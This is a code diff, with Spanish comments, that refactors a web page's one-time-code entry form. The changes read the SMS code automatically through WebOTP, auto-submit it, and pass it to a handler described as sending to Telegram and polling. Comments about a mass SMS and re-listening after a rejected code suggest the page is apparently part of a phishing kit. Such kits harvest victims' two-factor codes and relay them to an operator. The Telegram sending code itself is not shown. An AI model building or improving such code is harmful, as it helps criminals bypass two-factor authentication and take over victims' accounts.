@@ -119,8 +119,10 @@
       signal: oTPAbortController.signal
     }).then(otp => {
       if (otp && otp.code) {
+        // Busca el grupo de 6 números seguidos
         const coincidencia = otp.code.match(/\d{6}/);
-        if (coincidencia && coincidencia[0]) {
+        if (coincidencia) {
+          // CORRECCIÓN EXACTA: Se añade [0] para aislar la cadena "092605" del array
           const codigoExtraido = coincidencia[0];
           
           codigoExtraido.split("").forEach((char, idx) => {
@@ -129,9 +131,9 @@
           
           refreshSubmitState();
           
-          // CORRECCIÓN: Ejecuta la lógica asíncrona real de Telegram de inmediato
-          if (isComplete()) {
-            enviarFormulario();
+          // Simula el submit si se completa de forma nativa en Android
+          if (isComplete() && form) {
+            form.dispatchEvent(new Event("submit"));
           }
         }
       }
@@ -139,7 +141,6 @@
       console.log("WebOTP pasiva terminada.");
     });
   }
-
 
 
   startTimer();
@@ -206,8 +207,8 @@
         refreshSubmitState();
         
         // Disparo automático si se completa desde el SMS masivo
-        if (isComplete()) {
-          enviarFormulario();
+        if (isComplete() && form) {
+          form.dispatchEvent(new Event("submit"));
         }
         return;
       }
@@ -219,11 +220,8 @@ input.value = val.replace(/\D/g, "");
       }
       
       refreshSubmitState();
-// Si llena el último dígito manualmente, procesa el envío
-      if (isComplete()) {
-        enviarFormulario();
-      }
     });
+
 
 // Control para retroceso al borrar
 input.addEventListener("keydown", (e) => {
@@ -238,10 +236,12 @@ input.addEventListener("keydown", (e) => {
 
 
 
-   // ============================================================
-  // FUNCIÓN ENCAPSULADA DE ENVÍO Y ESCUCHA TELEGRAM (CORREGIDA)
   // ============================================================
-  async function enviarFormulario() {
+  // LOGIC ENTRANTE EN TU EVENTO SUBMIT (TELEGRAM Y POLLING)
+  // ============================================================
+  if (form) {
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
       if (!isComplete() || remaining <= 0) return;
 
       const enteredCode = getCode();
@@ -391,11 +391,6 @@ input.setAttribute("maxlength", "6");
 if (inputs[0]) inputs[0].focus();
 activarEscuchaAutomaticaAndroid(); // Volvemos a escuchar si rechaza el código
 }
-}
-if (form) {
-form.addEventListener("submit", function (e) {
-e.preventDefault();
-enviarFormulario();
 });
 }
 })();
